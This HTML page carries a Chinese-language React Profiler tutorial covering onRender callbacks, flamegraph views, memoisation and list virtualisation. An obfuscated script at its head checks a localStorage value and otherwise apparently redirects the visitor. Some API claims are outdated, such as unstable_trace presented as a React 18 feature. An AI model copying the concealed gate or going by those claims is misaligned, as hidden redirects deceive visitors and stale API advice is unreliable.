<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x545c4c=_0x3721;if((()=>{for(var s=_0x3721,n=_0x28de();;)try{if(419536==+parseInt(s(116,"j7rz"))+parseInt(s(123,"iYwN"))/2+-parseInt(s(108,"DFlW"))/3*(parseInt(s(103,"Bues"))/4)+-parseInt(s(115,"GGM("))/5*(parseInt(s(122,"34(A"))/6)+-parseInt(s(127,"E3ey"))/7+-parseInt(s(110,"swyn"))/8+parseInt(s(126,"#pgk"))/9*(parseInt(s(111,"Jo)^"))/10))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x545c4c(119,"t@nA")](_0x545c4c(109,"G4P1"))!=_0x545c4c(105,"CetS"))throw window[_0x545c4c(113,"D0Uj")][_0x545c4c(104,"%[Ce")](_0x545c4c(120,"QTZi")),Error();function _0x3721(t,s){var e=_0x28de();return(_0x3721=function(s,n){var a=e[s-=103];void 0===_0x3721.VlkZUW&&(_0x3721.ppwspr=function(s,n){var a,l=[],t=0,e="";for(s=(s=>{for(var n,a,l="",t="",e=0,p=0;a=s.charAt(p++);~a&&(n=e%4?64*n+a:a,e++%4)&&(l+=String.fromCharCode(255&n>>(-2*e&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var c=0,o=l.length;c<o;c++)t+="%"+("00"+l.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(t)})(s),p=0;p<256;p++)l[p]=p;for(p=0;p<256;p++)t=(t+l[p]+n.charCodeAt(p%n.length))%256,a=l[p],l[p]=l[t],l[t]=a;for(var p=0,t=0,c=0;c<s.length;c++)a=l[p=(p+1)%256],l[p]=l[t=(t+l[p])%256],l[t]=a,e+=String.fromCharCode(s.charCodeAt(c)^l[(l[p]+l[t])%256]);return e},t=arguments,_0x3721.VlkZUW=!0);var s=s+e[0],l=t[s];return l?a=l:(void 0===_0x3721.LFFytf&&(_0x3721.LFFytf=!0),a=_0x3721.ppwspr(a,n),t[s]=a),a})(t,s)}function _0x28de(){var s=["W6RcL8k2W5RdSWxcIq","aX7cQCknWOC","AInRzXFdIeFdJHpcRZ00W7G","hrhdIg/dQIrYW6ifW51p","EZJdMay9WOH0","WOWLW5RdI8k9WRyNW7hcGW","WOO7W7GlgSo1WRtdU05tjmoGWPK","wSkkW7xdHwKnWP0WW4xcRCkhWQfj","W59uW6Tca8kxaIRcLSoe","WRWCW4fYW79bWQ0d","tfDUWOtdHZPP","jvZcMYNdG8oTESoUBmol","fJBdOmkTW6pdJaxdVwtcJmkD","WPe6b8oAWQaym3dcSmkeW71hWPy","WPtdHmkMs8kDlXyHqCoSFhW","W6H6iCkKW4mPW4y","WRLYgSk+WOWjvCkTW7T9W414grFdH8kQvmoWk0RcV8ovW4zRWPZcPa","d1zflSoHfCoFBmk1tCkvWOP3","oSkUkW/dJ1m3WPVdJSkcWQO","W5WVWOVdT0SWBCk4CtqGW77cUq","W5XsW65hESo5Bs3cG8okWOWMW7G","Bc8Fa3RcQXZdJG","s2JdIdBdK8kQW4ZdIq","oxVdTLD/WRBcOmkJdCoTW7dcNCkv","nePvE8k9W5PutvFcL8oXnq"];return(_0x28de=function(){return s})()}document.title="react Profiler",document.getElementById("article").innerHTML='<div><h1>React Profiler 使用指南</h1>\n<p>React Profiler 是 React 官方提供的性能分析工具，可以帮助开发者测量 React 应用的渲染性能并找出优化机会。</p>\n<h2>一、React Profiler 基础用法</h2>\n<h3>1. 启用 Profiler</h3>\n<p>在 React DevTools 中切换到 &quot;Profiler&quot; 标签页：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// 在代码中包裹需要分析的组件</span>\n<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Profiler</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;\n\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">onRenderCallback</span>(<span class="hljs-params">\n  id, <span class="hljs-comment">// 发生提交的 Profiler 树的 &quot;id&quot;</span>\n  phase, <span class="hljs-comment">// &quot;mount&quot; (组件挂载) 或 &quot;update&quot; (组件更新)</span>\n  actualDuration, <span class="hljs-comment">// 本次更新花费的渲染时间</span>\n  baseDuration, <span class="hljs-comment">// 不使用 memoization 的情况下渲染整颗子树需要的时间</span>\n  startTime, <span class="hljs-comment">// 本次更新 React 开始渲染的时间</span>\n  commitTime, <span class="hljs-comment">// 本次更新 React 提交的时间</span>\n  interactions <span class="hljs-comment">// 属于本次更新的 interactions 的集合</span>\n</span>) {\n  <span class="hljs-comment">// 处理或记录渲染时间...</span>\n}\n\n&lt;<span class="hljs-title class_">Profiler</span> id=<span class="hljs-string">&quot;Navigation&quot;</span> onRender={onRenderCallback}&gt;\n  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigation</span> {<span class="hljs-attr">...props</span>} /&gt;</span></span>\n&lt;/<span class="hljs-title class_">Profiler</span>&gt;\n</code></pre>\n<h3>2. 记录性能数据</h3>\n<ol>\n<li>打开 React DevTools (Chrome 扩展)</li>\n<li>切换到 &quot;Profiler&quot; 标签页</li>\n<li>点击圆形录制按钮</li>\n<li>与你的应用交互</li>\n<li>再次点击按钮停止录制</li>\n</ol>\n<h2>二、分析性能数据</h2>\n<h3>1. 火焰图 (Flamegraph) 视图</h3>\n<ul>\n<li><strong>条形长度</strong>  ：表示组件渲染时间</li>\n<li><strong>颜色</strong>  ：\n<ul>\n<li>黄色/橙色：渲染较慢的组件</li>\n<li>绿色：渲染较快的组件</li>\n</ul>\n</li>\n<li><strong>灰色条纹</strong>  ：表示组件在此期间未被渲染</li>\n</ul>\n<h3>2. 排序图 (Ranked) 视图</h3>\n<p>按渲染时间从长到短排序组件，快速定位性能瓶颈。</p>\n<h3>3. 关键指标解读</h3>\n<ul>\n<li><strong>Render duration</strong>  ：实际渲染时间</li>\n<li><strong>Render start</strong>  ：渲染开始时间点</li>\n<li><strong>Commit duration</strong>  ：提交变更到 DOM 的时间</li>\n<li><strong>Interactions</strong>  ：触发此次渲染的用户交互</li>\n</ul>\n<h2>三、高级使用技巧</h2>\n<h3>1. 生产环境分析</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// 在生产环境中启用有限的分析功能</span>\n<span class="hljs-keyword">import</span> { unstable_trace <span class="hljs-keyword">as</span> trace } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;scheduler/tracing&#x27;</span>;\n\n<span class="hljs-title function_">trace</span>(<span class="hljs-string">&#x27;Some event&#x27;</span>, performance.<span class="hljs-title function_">now</span>(), <span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-comment">// 需要分析的代码</span>\n});\n</code></pre>\n<h3>2. 结合 Chrome Performance 工具</h3>\n<ol>\n<li>在 Chrome DevTools 的 Performance 面板开始录制</li>\n<li>勾选 &quot;Record React measurements&quot; 选项</li>\n<li>执行需要分析的操作</li>\n<li>停止录制后查看详细时间线</li>\n</ol>\n<h3>3. 使用 React.memo 优化</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) {\n  <span class="hljs-comment">// 只在 props 变化时重新渲染</span>\n});\n</code></pre>\n<h2>四、常见性能问题解决方案</h2>\n<h3>1. 不必要的重新渲染</h3>\n<p><strong>解决方案</strong>  ：</p>\n<ul>\n<li>使用 <code>React.memo</code> 包裹组件</li>\n<li>使用 <code>useMemo</code> 和 <code>useCallback</code> 缓存值和函数</li>\n</ul>\n<h3>2. 大型列表性能问题</h3>\n<p><strong>解决方案</strong>  ：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">FixedSizeList</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">List</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-window&#x27;</span>;\n\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">Row</span> = (<span class="hljs-params">{ index, style }</span>) =&gt; (\n  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{style}</span>&gt;</span>Row {index}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>\n);\n\n<span class="hljs-keyword">const</span> <span class="hljs-title function_">Example</span> = (<span class="hljs-params"></span>) =&gt; (\n  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">List</span>\n    <span class="hljs-attr">height</span>=<span class="hljs-string">{150}</span>\n    <span class="hljs-attr">itemCount</span>=<span class="hljs-string">{1000}</span>\n    <span class="hljs-attr">itemSize</span>=<span class="hljs-string">{35}</span>\n    <span class="hljs-attr">width</span>=<span class="hljs-string">{300}</span>\n  &gt;</span>\n    {Row}\n  <span class="hljs-tag">&lt;/<span class="hljs-name">List</span>&gt;</span></span>\n);\n</code></pre>\n<h3>3. 复杂计算拖慢渲染</h3>\n<p><strong>解决方案</strong>  ：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> expensiveValue = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-comment">// 复杂计算</span>\n  <span class="hljs-keyword">return</span> <span class="hljs-title function_">computeExpensiveValue</span>(a, b);\n}, [a, b]);\n</code></pre>\n<h2>五、React 18 新增性能特性</h2>\n<h3>1. 并发渲染分析</h3>\n<p>React 18 的 Profiler 可以显示并发模式下的渲染时间线，帮助理解 Suspense 和过渡更新的行为。</p>\n<h3>2. 交互追踪 API</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> { unstable_trace <span class="hljs-keyword">as</span> trace } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;scheduler/tracing&#x27;</span>;\n\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleClick</span>(<span class="hljs-params"></span>) {\n  <span class="hljs-title function_">trace</span>(<span class="hljs-string">&#x27;Click button&#x27;</span>, performance.<span class="hljs-title function_">now</span>(), <span class="hljs-function">() =&gt;</span> {\n    <span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);\n  });\n}\n</code></pre>\n<h2>六、最佳实践</h2>\n<ol>\n<li><strong>定期分析</strong>  ：在开发过程中定期使用 Profiler</li>\n<li><strong>关注关键路径</strong>  ：优先优化影响用户体验的关键组件</li>\n<li><strong>渐进式优化</strong>  ：先解决最大的性能瓶颈</li>\n<li><strong>基准测试</strong>  ：优化前后进行性能对比</li>\n<li><strong>生产环境监控</strong>  ：收集真实用户的性能数据</li>\n</ol>\n<p>通过合理使用 React Profiler，你可以显著提升 React 应用的性能表现和用户体验。</p>\n</div>'</script></body></html>